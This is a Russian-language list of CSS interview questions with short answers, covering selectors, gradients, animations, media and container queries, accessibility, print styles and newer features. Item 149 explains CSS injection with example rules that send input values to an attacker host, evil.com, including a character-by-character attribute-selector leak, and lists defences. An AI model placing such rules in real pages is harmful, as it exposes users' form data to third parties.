93. Как работают `:hover`, `:focus`, `:active`?
	- `:hover` — курсор над элементом (на тач-устройствах "залипает" после tap)
	- `:focus` — элемент получил фокус (tab, click, программно)
	- `:active` — элемент в процессе активации (нажатие мыши)
	- Правильный порядок: `:link → :visited → :hover → :focus → :active` (LVHFA)
	- `:focus-visible` — фокус только через клавиатуру (без стилей при клике мышью)

94. Как работают `:visited` и `:link`?
	- `:link` — непосещённая ссылка (`<a>` с `href`)
	- `:visited` — посещённая ссылка
	- Ограничения безопасности: `:visited` может менять только color, background-color, border-color, column-rule-color, outline-color, fill, stroke
	- `getComputedStyle()` возвращает стили `:link` для `:visited` (protection)

95. Как работают `:disabled` и `:enabled`?
	- `:disabled` — элемент формы с атрибутом `disabled`
	- `:enabled` — элемент формы без `disabled` (default)
	- Работает на: input, select, textarea, button, fieldset
	- `fieldset:disabled` — отключает все вложенные элементы формы

96. Как работают `:checked` и `:indeterminate`?
	- `:checked` — checkbox/radio в выбранном состоянии, option selected
	- `:indeterminate` — неопределённое состояние: checkbox с `indeterminate = true` (JS), radio group без выбора, progress без value
	- Используется для CSS-only toggle паттернов:
	```css
	input:checked + label { color: blue; }
	input:checked ~ .content { display: block; }
	```

97. Как работают `:valid` и `:invalid` для форм?
	- `:valid` — элемент формы прошёл HTML validation (pattern, required, min, max, type)
	- `:invalid` — не прошёл validation
	- Проблема: `:invalid` срабатывает сразу при загрузке (до ввода пользователя)
	- Решение: `:invalid:not(:placeholder-shown)` или `:user-invalid` (новый)

98. Как работают `:required` и `:optional`?
	- `:required` — элемент с атрибутом `required`
	- `:optional` — элемент без `required`
	- Работает на: input, select, textarea
	```css
	input:required { border-left: 3px solid red; }
	input:optional { border-left: 3px solid gray; }
	```

99. Как работают `:in-range` и `:out-of-range`?
	- `:in-range` — значение input в пределах min/max
	- `:out-of-range` — значение за пределами min/max
	- Работает только на: `<input type="number">`, `<input type="range">`, `<input type="date">` и подобные

100. Как работают `:read-only` и `:read-write`?
	- `:read-only` — элемент с атрибутом `readonly` или не редактируемый
	- `:read-write` — редактируемый элемент (input без readonly, contenteditable)
	- Разница readonly vs disabled: readonly отправляется с формой, disabled — нет

#### Цвета и фон

101. Что такое `background-attachment`?
	- Определяет поведение фона при скролле
	- `scroll` (default) — фон скроллится с элементом
	- `fixed` — фон зафиксирован относительно viewport (parallax эффект)
	- `local` — фон скроллится с содержимым элемента (для overflow: scroll)

102. Разница между `rgba()`, `hsla()`, `hex`?
	- `hex` (#rrggbb / #rgb / #rrggbbaa) — шестнадцатеричный, компактный
	- `rgb(r g b / alpha)` — RGB модель (0-255 или %), интуитивно понятная
	- `hsl(h s l / alpha)` — Hue (0-360°), Saturation (%), Lightness (%), удобен для создания палитр
	- Modern syntax: без запятых, alpha через `/`: `rgb(59 130 246 / 0.5)`

103. Как работают `background-size` и `background-position`?
	- `background-size: cover` — заполнить контейнер (может обрезать)
	- `background-size: contain` — вписать целиком (могут быть полосы)
	- `background-size: 100px 200px` — конкретные размеры
	- `background-position: center`, `right 20px bottom 10px` (4-value syntax)
	- `%` в position: процент от (container - image) размера

104. Как работают `background-clip` и `background-origin`?
	- `background-clip` — где ОБРЕЗАЕТСЯ фон: `border-box`, `padding-box`, `content-box`, `text`
	- `background-origin` — откуда НАЧИНАЕТСЯ фон: `border-box`, `padding-box` (default), `content-box`
	- `background-clip: text` + transparent text — текст с фоновым изображением
	```css
	.gradient-text {
	  background: linear-gradient(to right, red, blue);
	  -webkit-background-clip: text;
	  background-clip: text;
	  color: transparent;
	}
	```

105. Как работают градиенты `linear-gradient` и `radial-gradient`?
	- `linear-gradient(direction, color-stops)` — линейный
	- Direction: `to right`, `to bottom left`, `45deg`, `0.25turn`
	- `radial-gradient(shape size at position, color-stops)` — радиальный
	- Shape: `circle`, `ellipse` (default)
	- Size: `closest-side`, `farthest-corner`, px/%
	- Color stops: `red 0%, blue 50%, green 100%`

106. Как работает `conic-gradient` и `repeating-linear-gradient`?
	- `conic-gradient(from angle at position, color-stops)` — конический (по кругу)
	- Используется для: pie charts, color wheels, circular patterns
	- `repeating-linear-gradient` — повторяющийся: `repeating-linear-gradient(45deg, #000 0 10px, #fff 10px 20px)`
	```css
	/* Pie chart */
	.chart { background: conic-gradient(red 0% 30%, blue 30% 60%, green 60% 100%); border-radius: 50%; }
	```

107. Как работают `background-blend-mode` и `mix-blend-mode`?
	- `background-blend-mode` — смешивание ФОНОВ элемента между собой
	- `mix-blend-mode` — смешивание элемента с НИЖЕЛЕЖАЩИМИ элементами
	- Режимы: `multiply`, `screen`, `overlay`, `darken`, `lighten`, `color-dodge`, `color-burn`, `difference`, `exclusion`
	- `isolation: isolate` — создаёт новый stacking context, предотвращая blend с соседями

108. Как работают `opacity` и `color` функции?
	- `opacity: 0-1` — прозрачность всего элемента И ДЕТЕЙ (не наследуется, но визуально влияет)
	- Альтернативы для прозрачности только цвета: `rgba()`, `hsla()`, `transparent`
	- `opacity < 1` создаёт stacking context
	- Для анимации: `opacity` — composited property (GPU), дёшево анимировать

109. Как работают `hsl()`, `hwb()`, `lab()`, `lch()` цветовые функции?
	- `hsl(hue saturation lightness)` — интуитивная модель (поворот hue = другой цвет)
	- `hwb(hue whiteness blackness)` — проще для человека: hue + сколько белого/чёрного
	- `lab(lightness a b)` — perceptually uniform, широкий gamut
	- `lch(lightness chroma hue)` — как lab, но в полярных координатах
	- `oklch()`, `oklab()` — улучшенные версии, рекомендуются для modern CSS

#### Анимации и переходы

110. Чем отличаются анимации CSS от JS?
	- CSS анимации `transform` и `opacity` выполняются на compositor thread (GPU) — не блокируют main thread
	- JS анимации (без Web Animations API) работают на main thread — могут тормозить при тяжёлых вычислениях
	- CSS: проще для простых анимаций, автоматическая GPU оптимизация
	- JS: больше контроля, динамические значения, сложная логика, Web Animations API даёт лучшее из обоих миров

111. Способы анимаций в CSS
	- `transition` — анимация при смене состояния (hover, class change)
	- `@keyframes` + `animation` — автономная анимация с полным контролем
	- `transform` — GPU-ускоренные трансформации (translate, rotate, scale)
	- Scroll-driven animations — привязка к скроллу (`animation-timeline: scroll()`)
	- View Transitions API — анимация переходов между состояниями страницы

112. Разница между `transition` и `animation`?
	- `transition`: реактивная (нужен триггер — hover, class), от A к B, одноразовая
	- `animation`: автономная, множество keyframes, может зацикливаться, работает без триггера
	- `transition`: проще, `animation`: мощнее
	- `transition` не может: пауза, реверс, множественные шаги, автозапуск

113. Как работают `@keyframes`?
	- Определяют шаги анимации с промежуточными состояниями
	- `from` = `0%`, `to` = `100%`, можно любые проценты
	- Привязываются через `animation-name`
	```css
	@keyframes slide-in {
	  from { transform: translateX(-100%); opacity: 0; }
	  50% { opacity: 0.5; }
	  to { transform: translateX(0); opacity: 1; }
	}
	.element { animation: slide-in 0.3s ease-out; }
	```

114. Что такое `animation-fill-mode`?
	- Определяет стили элемента ДО и ПОСЛЕ анимации
	- `none` (default) — без заполнения, возврат к исходным стилям
	- `forwards` — сохраняет стили последнего keyframe после завершения
	- `backwards` — применяет стили первого keyframe до начала (при delay)
	- `both` — forwards + backwards

115. Как работает `transform` и его функции?
	- 2D: `translate(x, y)`, `rotate(angle)`, `scale(x, y)`, `skew(x, y)`
	- 3D: `translateZ()`, `rotateX/Y/Z()`, `perspective()`
	- `matrix(a, b, c, d, tx, ty)` — все 2D трансформации одной матрицей
	- Порядок важен: `rotate(45deg) translate(100px)` ≠ `translate(100px) rotate(45deg)`
	- Новые отдельные свойства: `translate`, `rotate`, `scale` (без `transform`)

116. Свойство `will-change`
	- Подсказка браузеру о будущих изменениях: `will-change: transform, opacity`
	- Создаёт compositor layer (GPU) заранее — анимация начинается без задержки
	- Потребляет память — не применять ко всем элементам!
	- Антипаттерн: `* { will-change: transform; }` — огромный расход памяти
	- Лучшая практика: добавлять через JS перед анимацией, убирать после

117. Как работает `transform-origin`?
	- Точка, относительно которой выполняются трансформации
	- Default: `50% 50%` (центр элемента)
	- Значения: `top left`, `center bottom`, `20px 30px`, `50% 0`
	- Влияет на rotate, scale, skew — элемент вращается/масштабируется относительно этой точки

118. Как работает `transform-style: preserve-3d`?
	- Позволяет дочерним элементам сохранять 3D позиционирование
	- `flat` (default) — дети проецируются на плоскость родителя
	- `preserve-3d` — дети живут в 3D пространстве родителя
	- Необходимо для CSS 3D карточек, кубов, карусели

119. Как работают `perspective` и `perspective-origin`?
	- `perspective: 1000px` — расстояние от зрителя до z=0 плоскости
	- На контейнере: `perspective: 1000px` — общая перспектива для всех детей
	- В transform: `transform: perspective(1000px) rotateY(45deg)` — индивидуальная
	- `perspective-origin` — точка схода (default: center)
	- Маленькое значение (100px) — сильный эффект, большое (2000px) — слабый

120. Что такое 3D трансформации?
	- Трансформации по трём осям: X (горизонт), Y (вертикаль), Z (к зрителю)
	- `rotateX(deg)` — поворот вокруг горизонтальной оси
	- `rotateY(deg)` — вокруг вертикальной (карточка flip)
	- `rotateZ(deg)` = `rotate(deg)` — вокруг оси Z
	- `translate3d(x, y, z)`, `rotate3d(x, y, z, angle)`, `scale3d(x, y, z)`
	- Требуют `perspective` для визуального 3D эффекта

#### Overflow

121. Разница между `overflow: hidden, scroll, auto, visible`?
	- `visible` (default) — контент выходит за границы элемента
	- `hidden` — контент обрезается, scrollbar нет
	- `scroll` — scrollbar ВСЕГДА показан (даже если контент помещается)
	- `auto` — scrollbar только когда контент не помещается
	- `clip` — как hidden, но НЕ создаёт scroll container (position: sticky работает внутри)
	- `overflow-x`, `overflow-y` — отдельно по осям

#### Методы раскладки

122. Как работает Float layout (устаревший)?
	- `float: left/right` — элемент "всплывает", текст обтекает
	- Проблема: родитель "схлопывается" (высота 0)
	- Решение: clearfix (`::after { content: ''; display: block; clear: both; }`)
	- Сейчас используется почти исключительно для обтекания текстом изображений

123. Как работает Table layout?
	- `display: table`, `table-row`, `table-cell` — табличная раскладка без `<table>`
	- Вертикальное центрирование: `display: table-cell; vertical-align: middle;`
	- Равные колонки по умолчанию
	- Устарел для layout: заменён Flexbox и Grid

124. Как работает Multi-column layout?
	- `column-count: 3` — фиксированное количество колонок
	- `column-width: 200px` — минимальная ширина (количество автоматически)
	- `columns: 3 200px` — shorthand
	- `column-gap`, `column-rule` (разделитель), `break-inside: avoid`
	- Используется для: текстовых блоков, списков, masonry-подобных раскладок

#### Адаптивность

125. Что такое медиа-запросы и как они работают?
	- `@media` — условное применение стилей на основе характеристик устройства/viewport
	- Типы: `screen`, `print`, `all`
	- Features: `width`, `height`, `orientation`, `resolution`, `hover`, `pointer`, `prefers-*`
	- Операторы: `and`, `,` (or), `not`
	- Modern syntax: `@media (width >= 768px)` — range queries

126. Разница между `min-width` и `max-width` в медиа-запросах?
	- `min-width: 768px` — применяется когда viewport >= 768px (mobile-first)
	- `max-width: 767px` — применяется когда viewport <= 767px (desktop-first)
	- Mobile-first рекомендуется: базовые стили для мобильных, расширяем через min-width

127. Что такое viewport и как он влияет на адаптивность?
	- Viewport — видимая область браузера для отображения контента
	- `<meta name="viewport" content="width=device-width, initial-scale=1">` — обязателен для мобильных
	- Без meta viewport: мобильные браузеры используют layout viewport ~980px и масштабируют
	- `width=device-width` — layout viewport = ширине устройства

128. Как работают `@media` правила?
	- Условная группировка CSS правил
	- `@media screen and (min-width: 768px) { }` — экраны >= 768px
	- Вложенность: `@media screen { @media (min-width: 768px) { } }`
	- Можно в HTML: `<link rel="stylesheet" href="print.css" media="print">`
	- Браузер загружает ВСЕ stylesheets, но не-matching получают низкий приоритет загрузки

129. Как работают CSS Container Queries?
	- Применяют стили на основе размера КОНТЕЙНЕРА (не viewport)
	- `container-type: inline-size` — создаёт query container
	- `@container (min-width: 400px) { }` — стили при ширине контейнера >= 400px
	- Позволяют создавать по-настоящему переиспользуемые компоненты

130. Mobile-first vs Desktop-first подходы в адаптивном дизайне?
	- Mobile-first: базовые стили для мобильных + `@media (min-width)` для расширения
	- Desktop-first: базовые для десктопа + `@media (max-width)` для сужения
	- Mobile-first рекомендуется: progressive enhancement, мобильные грузят меньше CSS

131. Что такое Fluid typography?
	- Плавное масштабирование размера шрифта в зависимости от viewport
	- Вместо дискретных breakpoints — непрерывное изменение
	- `font-size: clamp(1rem, 0.5rem + 2vw, 3rem)`
	- Формула: `preferred = minSize + (maxSize - minSize) * (100vw - minViewport) / (maxViewport - minViewport)`

132. Как работает `clamp()` для fluid typography?
	- `clamp(MIN, PREFERRED, MAX)` — значение зажато между min и max
	- MIN — минимальный размер (accessibility: не менее 1rem)
	- PREFERRED — формула с vw для плавного масштабирования
	- MAX — максимальный размер
	```css
	h1 { font-size: clamp(1.5rem, 1rem + 2vw, 3rem); }
	p { font-size: clamp(1rem, 0.9rem + 0.5vw, 1.25rem); }
	```

133. Container queries vs Media queries когда использовать?
	- Media queries: глобальный layout (header, footer, page grid)
	- Container queries: переиспользуемые компоненты (card, sidebar content)
	- Container queries решают проблему: компонент в узком sidebar ведёт себя иначе чем в main content, media query этого не учитывает

134. Как работает `aspect-ratio` для responsive images?
	- `aspect-ratio: 16 / 9` — задаёт соотношение сторон
	- Браузер вычисляет height из width (или наоборот)
	- Заменяет padding-top hack: `padding-top: 56.25%`
	- Для img: работает как hint пока изображение загружается (предотвращает CLS)
	- Если указаны и width и height атрибуты на `<img>`, браузер автоматически вычисляет aspect-ratio

#### Доступность (Accessibility)

135. Как работает `prefers-reduced-motion`?
	- Media query для пользователей, предпочитающих уменьшенную анимацию
	- `@media (prefers-reduced-motion: reduce) { }` — убрать/уменьшить анимации
	- Включается в настройках ОС (macOS: Reduce Motion, Windows: Show animations off)
	- Best practice: отключить длительные анимации, сохранить мгновенные переходы

136. Как работает `prefers-color-scheme`?
	- Определяет предпочтение тёмной/светлой темы ОС
	- `@media (prefers-color-scheme: dark) { }` — стили для тёмной темы
	- Комбинируется с CSS-переменными для theme switching
	```css
	:root { --bg: white; --text: black; }
	@media (prefers-color-scheme: dark) {
	  :root { --bg: #1a1a1a; --text: #f0f0f0; }
	}
	```

137. Как работает `forced-colors`?
	- `@media (forced-colors: active) { }` — Windows High Contrast Mode
	- Браузер принудительно применяет системные цвета
	- Используйте system colors: `Canvas`, `CanvasText`, `LinkText`, `ButtonFace`, `ButtonText`
	- Некоторые свойства игнорируются: box-shadow, text-shadow, background-image (кроме url())

138. Что такое High contrast mode в CSS?
	- Режим Windows для слабовидящих — высококонтрастные системные цвета
	- CSS forced-colors: active — все цвета заменяются системными
	- `forced-color-adjust: none` — отключить принудительные цвета для элемента (осторожно!)
	- Тестируйте: Chrome DevTools → Rendering → Emulate forced colors

#### Стили для печати

139. Как работают `@media print` стили?
	- Применяются при печати страницы или сохранении в PDF
	- Рекомендуется: скрыть nav/footer/ads, убрать фон, показать URL ссылок
	- `color-adjust: exact` / `print-color-adjust: exact` — сохранить цвета при печати
	- Тестировать: Ctrl+P или Chrome DevTools → Rendering → Emulate CSS media type: print

140. Что такое Page breaks в CSS?
	- Управление разрывами страниц при печати
	- `break-before: page` — новая страница перед элементом
	- `break-after: page` — новая страница после
	- `break-inside: avoid` — не разрывать элемент между страницами
	- Старые свойства: `page-break-before`, `page-break-after`, `page-break-inside` (deprecated)

141. Какие Print-specific properties существуют?
	- `@page { size: A4 landscape; margin: 2cm; }` — размер и отступы страницы
	- `orphans: 3` — минимум строк внизу страницы
	- `widows: 3` — минимум строк вверху страницы
	- `@page :first { margin-top: 5cm; }` — стили первой страницы
	- `marks: crop cross` — метки обрезки

#### Интернационализация

142. Как работает RTL (right-to-left) поддержка?
	- `direction: rtl` — текст справа налево (арабский, иврит)
	- `dir="rtl"` в HTML предпочтительнее CSS `direction`
	- CSS Logical Properties решают проблему: `margin-inline-start` вместо `margin-left`
	- `writing-mode: horizontal-tb | vertical-rl | vertical-lr` — направление текста

143. Как работают `direction` и `writing-mode`?
	- `direction: ltr | rtl` — направление inline контента
	- `writing-mode: horizontal-tb` — горизонтальный (default для латиницы)
	- `writing-mode: vertical-rl` — вертикальный справа налево (японский, китайский)
	- `writing-mode: vertical-lr` — вертикальный слева направо (монгольский)
	- Влияет на: block/inline direction, margin/padding interpretation

144. Как локализуется CSS?
	- CSS Logical Properties: `margin-block`, `margin-inline`, `inset-block`, `inset-inline`
	- `text-align: start | end` вместо `left | right`
	- `:dir(rtl)` / `:dir(ltr)` — селектор по направлению
	- `float: inline-start | inline-end` (пока ограниченная поддержка)

#### Архитектура CSS

145. Что такое BEM методология?
	- Block Element Modifier: `.block__element--modifier`
	- Block: самостоятельный компонент (`.card`)
	- Element: часть блока (`.card__title`)
	- Modifier: вариация (`.card--featured`, `.card__title--large`)
	- Плоская структура: все селекторы имеют одинаковую специфичность (0,1,0)

146. Что такое OOCSS и SMACSS?
	- OOCSS (Object-Oriented CSS): разделение структуры и оформления, контейнера и содержимого
	- SMACSS (Scalable & Modular Architecture): 5 категорий — Base, Layout, Module, State, Theme
	- OOCSS: `.media { display: flex; }` + `.media-img { margin-right: 1rem; }`
	- SMACSS: `.l-sidebar { }`, `.is-active { }`, `.theme-dark { }`

147. Что такое CSS Modules?
	- Локальные (scoped) стили: каждый класс получает уникальный хеш
	- `.title` → `.title_abc123` в DOM
	- Импорт: `import styles from './Card.module.css'; <div className={styles.title}>`
	- `:global(.class)` — глобальный стиль без хеширования
	- Поддержка: webpack, Vite, Next.js

148. Что такое CSS-in-JS концепции?
	- Стили определяются в JavaScript: styled-components, emotion, vanilla-extract
	- Runtime (styled-components): генерирует CSS в runtime, overhead
	- Zero-runtime (vanilla-extract, Linaria): CSS извлекается в build time
	- Плюсы: co-location, dynamic styles, TypeScript types
	- Минусы: runtime cost, bundle size, SSR complexity

#### Безопасность CSS

149. Что такое CSS injection атаки?
	- Внедрение вредоносного CSS через пользовательский ввод
	- `background: url('https://evil.com/steal?data=' attr(value))` — утечка данных через attr()
	- `input[value^="a"] { background: url('https://evil.com/?char=a'); }` — побуквенное определение значений
	- Защита: санитизация пользовательского CSS, CSP, не вставлять user input в style

150. Как работает Content Security Policy для CSS?
	- `style-src 'self'` — только CSS с того же домена
	- `style-src 'nonce-abc123'` — inline styles с конкретным nonce
	- `style-src 'unsafe-inline'` — разрешить все inline стили (небезопасно)
	- CSP блокирует: inline style без nonce, eval в CSS, сторонние stylesheets

#### Производительность

151. Что такое CSS-оптимизация?
	- Минификация: удаление пробелов, комментариев (cssnano)
	- Dead code elimination: удаление неиспользуемых правил (PurgeCSS)
	- Critical CSS: inline критических стилей в `<head>`
	- Code splitting: загрузка CSS по маршрутам
	- Оптимизация селекторов: избегать глубокой вложенности

152. Как работает `contain` и `content-visibility`?
	- `contain: layout paint size` — изолирует элемент от остального DOM для layout/paint
	- `content-visibility: auto` — элемент не рендерится пока вне viewport (lazy rendering)
	- `contain-intrinsic-size: 0 500px` — предполагаемый размер для content-visibility
	- Экономит rendering cost для длинных страниц: списки, ленты, таблицы

153. Что такое Critical CSS?
	- CSS, необходимый для рендеринга above-the-fold контента
	- Inline в `<head>` для мгновенного First Paint
	- Остальной CSS загружается асинхронно: `<link rel="preload" as="style">`
	- Инструменты: critical, penthouse, critters (webpack plugin)
	- Автоматизация: critters в Next.js, Nuxt

#### Современные возможности

154. Что такое CSS Logical Properties?
	- Свойства, адаптирующиеся к `direction` и `writing-mode`
	- `margin-inline-start` вместо `margin-left` (= left в LTR, right в RTL)
	- `block-size` вместо `height`, `inline-size` вместо `width`
	- `inset-block`, `inset-inline` вместо `top/bottom`, `left/right`

155. Как работает `@supports`?
	- Feature queries — проверка поддержки CSS свойств
	- `@supports (display: grid) { }` — стили если Grid поддерживается
	- `@supports not (display: grid) { }` — fallback
	- `@supports selector(:has(*)) { }` — проверка поддержки селектора
	- Progressive enhancement: базовые стили + @supports для улучшений

156. Как работают `margin-inline`, `margin-block`?
	- `margin-inline` = `margin-inline-start` + `margin-inline-end` (= margin-left + margin-right в LTR)
	- `margin-block` = `margin-block-start` + `margin-block-end` (= margin-top + margin-bottom)
	- Shorthand: `margin-inline: 1rem 2rem` (start, end)

157. Как работают `padding-inline`, `padding-block`?
	- Аналогично margin: `padding-inline` = start + end по inline axis
	- `padding-block` = start + end по block axis
	- В `writing-mode: vertical-rl`: inline = вертикаль, block = горизонталь

158. Как работают `border-inline`, `border-block`?
	- `border-inline` — border по inline direction (left/right в LTR)
	- `border-block` — border по block direction (top/bottom)
	- Полный набор: `border-inline-start-color`, `border-block-end-width`, etc.

159. Что такое CSS Houdini API?
	- Набор low-level API для расширения CSS из JavaScript
	- **Paint API** — кастомный рисунок через `paint()` function
	- **Properties and Values API** — `@property` с типизацией и анимацией
	- **Typed OM** — типизированный доступ к CSS значениям (вместо строк)
	- **Layout API** — кастомные алгоритмы раскладки (экспериментально)
	- **Animation Worklet** — кастомные анимации вне main thread

160. Как работает CSS Paint API?
	- Регистрация кастомного paint: `CSS.paintWorklet.addModule('painter.js')`
	- Использование: `background-image: paint(my-painter)`
	- В worklet: класс с `paint(ctx, size, props)` — canvas-like API
	- Позволяет создавать динамические фоны, паттерны, эффекты

161. Как работает CSS Properties and Values API?
	- `@property --my-color { syntax: '<color>'; inherits: false; initial-value: red; }`
	- Типизирует CSS custom properties — позволяет анимировать!
	- Без `@property`: `--color` — строка, transition между строками невозможен
	- С `@property`: `--color` — цвет, можно `transition: --color 0.3s`

162. Как работает CSS Typed OM?
	- JavaScript API для типизированного доступа к CSS значениям
	- `el.computedStyleMap().get('width')` → `CSSUnitValue { value: 200, unit: 'px' }`
	- Вместо строк (`'200px'`) — типизированные объекты с числами и единицами
	- Производительнее и безопаснее чем `getComputedStyle` + parsing строк

163. Как работает CSS Layout API?
	- Экспериментальный API для создания кастомных layout алгоритмов
	- `display: layout(my-layout)` — подключение кастомного layout
	- Worklet: `registerLayout('my-layout', class { ... })`
	- Пока ограниченная поддержка в браузерах

#### Отладка и инструменты

164. Как использовать DevTools для отладки CSS?
	- Elements panel: inspect элемент, edit styles в реальном времени
	- Computed tab: финальные вычисленные значения, откуда наследовано
	- Box Model visualization: margin, border, padding, content
	- CSS Grid/Flexbox overlays: визуализация сеток
	- Rendering tab: Paint flashing, Layout Shift Regions, FPS meter
	- Coverage tab: процент используемого CSS

165. Что такое CSS-валидация?
	- Проверка CSS на соответствие стандартам W3C
	- W3C CSS Validator: jigsaw.w3.org/css-validator
	- Lint: stylelint — линтер с правилами для ошибок, конвенций, performance
	- IDE: встроенная валидация в VS Code, WebStorm
	- Browser DevTools: warnings в Console и Elements panel

166. Как работает CSS-аудит производительности?
	- Chrome DevTools Performance tab: recording, flame chart, Layout/Paint/Composite timings
	- Lighthouse: аудит CSS coverage, render-blocking resources, CLS
	- Chrome DevTools Coverage tab: % неиспользуемого CSS
	- Rendering tab: Paint flashing (подсвечивает repaints), Layout Shift Regions
	- Performance Monitor: real-time CPU, Layouts/sec, Style recalcs/sec

#### Дополнительные темы

167. Как работают CSS Filters (`filter`, `backdrop-filter`)?
	- `filter` — применяется к элементу: `blur()`, `brightness()`, `contrast()`, `grayscale()`, `hue-rotate()`, `invert()`, `opacity()`, `saturate()`, `sepia()`, `drop-shadow()`
	- `backdrop-filter` — к области ЗА элементом (стекло-эффект): `backdrop-filter: blur(10px)`
	- `drop-shadow()` vs `box-shadow`: drop-shadow следует форме элемента (включая прозрачность PNG)
	- `filter` создаёт stacking context и containing block для fixed позиционирования

168. Как работает `clip-path` и CSS Masking?
	- `clip-path` — обрезка элемента по форме: `circle()`, `ellipse()`, `polygon()`, `inset()`, `path()`
	- `mask-image` — маска через изображение/градиент (прозрачность = видимость)
	- `clip-path: polygon(50% 0%, 0% 100%, 100% 100%)` — треугольник
	- Анимируется: можно анимировать clip-path между формами с одинаковым числом точек

169. Как работают CSS Shapes (`shape-outside`, `shape-margin`)?
	- `shape-outside` — форма обтекания текстом вокруг float-элемента
	- Значения: `circle()`, `ellipse()`, `polygon()`, `inset()`, `url(image.png)`
	- `shape-margin` — отступ текста от shape
	- Работает ТОЛЬКО с float элементами

170. Как работает CSS Scroll Snap (`scroll-snap-type`, `scroll-snap-align`)?
	- Контейнер: `scroll-snap-type: x mandatory` или `y proximity`
	- Items: `scroll-snap-align: start | center | end`
	- `mandatory` — всегда snap к ближайшей точке, `proximity` — snap если близко
	- `scroll-snap-stop: always` — не пропускать элементы при быстром скролле
	- Идеально для: карусели, слайдеры, горизонтальные списки

171. Как работает `scroll-behavior: smooth`?
	- Плавная прокрутка при навигации через якоря (`#section`) и `scrollTo()`
	- `html { scroll-behavior: smooth; }` — глобально
	- Уважайте `prefers-reduced-motion`: отключайте smooth для reduce
	- JS fallback: `element.scrollIntoView({ behavior: 'smooth' })`

172. Как работают `scroll-padding` и `scroll-margin`?
	- `scroll-padding` — на контейнере: отступ от края при snap/scroll-to (учитывает sticky header)
	- `scroll-margin` — на элементе: отступ от snap point
	- `html { scroll-padding-top: 80px; }` — компенсация fixed header при якорных ссылках
	- Работает с scroll-snap и fragment navigation (#id)

173. Как работает CSS Containment (`contain: layout`, `contain: paint`)?
	- `contain: layout` — layout элемента изолирован от остального документа
	- `contain: paint` — рисование не выходит за пределы box (clipping, stacking context)
	- `contain: size` — размер не зависит от детей (нужно задать явно)
	- `contain: style` — counters/quotes не влияют на внешний документ

174. Как работает `contain: size`, `contain: style`, `contain: strict`?
	- `contain: strict` = `contain: size layout paint style` — максимальная изоляция
	- `contain: content` = `contain: layout paint style` (без size)
	- `contain: size` опасен без явных размеров — элемент схлопнется в 0x0
	- Используйте `contain: content` для большинства случаев

175. Как работает изоляция стилей через containment?
	- Containment ограничивает "область влияния" элемента на layout/paint/style
	- Браузер может оптимизировать: если элемент содержит (`contain: layout`), изменения внутри не вызовут reflow снаружи
	- `content-visibility: auto` автоматически применяет containment + skip rendering

176. Как работает наследование CSS переменных?
	- Custom properties наследуются по DOM-дереву (как color)
	- Можно переопределить на любом уровне
	- `:root { --color: red; }` → `.child { --color: blue; }` → потомки .child увидят blue
	- `@property` с `inherits: false` — отключает наследование

177. Как работают Fallback значения в CSS переменных?
	- `var(--color, red)` — если `--color` не определён, используется `red`
	- Вложенные: `var(--color, var(--fallback-color, blue))`
	- Fallback НЕ срабатывает при невалидном значении (например, `--color: 42px` для `color`) — свойство получит `unset`
	- Для отладки: DevTools показывает, какая переменная используется

178. Как работает область видимости CSS переменных?
	- Определяются на селекторе → доступны этому элементу и его потомкам
	- `:root` — глобальная область видимости
	- `.card { --card-bg: white; }` — доступно только внутри .card
	- Media queries: `@media (prefers-color-scheme: dark) { :root { --bg: black; } }`

179. Как работает динамическое изменение CSS переменных через JS?
	- Чтение: `getComputedStyle(el).getPropertyValue('--color')`
	- Запись: `el.style.setProperty('--color', 'blue')`
	- На :root: `document.documentElement.style.setProperty('--color', 'blue')`
	- Реактивно: все элементы, использующие переменную, обновятся автоматически
	- Performance: одно изменение custom property может обновить сотни элементов

180. Как работают CSS Custom Media Queries?
	- `@custom-media --tablet (min-width: 768px)` — именованный media query
	- Использование: `@media (--tablet) { }`
	- Пока нет нативной поддержки — только через PostCSS (postcss-custom-media)
	- Альтернатива: CSS custom properties для значений внутри media queries

181. Как работает `@scope` для изоляции стилей?
	- `@scope (.card) { .title { color: red; } }` — стили ограничены потомками .card
	- Lower boundary: `@scope (.card) to (.card__footer) { }` — исключить часть поддерева
	- Scope proximity: при конфликте побеждает ближайший scope (не специфичность)
	- Альтернатива CSS Modules для нативной изоляции

182. Как работает CSS Cascade Layers (`@layer`)?
	- Группировка стилей в именованные слои с явным приоритетом
	- `@layer reset, base, components;` — объявление порядка
	- Последний layer > первый, unlayered > все layers
	- Для !important — инверсия порядка
	- Используется для: reset < third-party < design-system < components < overrides

183. Как работает CSS Color-mix функция?
	- `color-mix(in srgb, red 50%, blue 50%)` — смешивание цветов
	- Interpolation space: `srgb`, `oklch`, `lab`, `hsl` — влияет на результат
	- Неравное смешивание: `color-mix(in oklch, red 30%, blue)` — 30% red, 70% blue
	- Применение: автоматические hover/active цвета, палитры
	```css
	:root { --primary: #3b82f6; }
	.btn:hover { background: color-mix(in oklch, var(--primary), black 20%); }
	```

184. Как работает CSS Relative Color Syntax?
	- Модификация каналов существующего цвета: `rgb(from red r g 200)` — заменить blue канал
	- `oklch(from var(--color) l c calc(h + 30))` — повернуть hue на 30°
	- `oklch(from var(--color) calc(l * 1.2) c h)` — осветлить на 20%
	- Мощный инструмент для программной генерации палитр из одного базового цвета

185. Как работает CSS Anchor Positioning?
	- Привязка элемента к "якорю" (другому элементу) без JavaScript
	- Якорь: `anchor-name: --tooltip-anchor`
	- Позиционируемый: `position-anchor: --tooltip-anchor; top: anchor(bottom);`
	- `position-try-fallbacks` — альтернативные позиции если не помещается
	- Идеально для: tooltips, dropdowns, popovers без JS библиотек
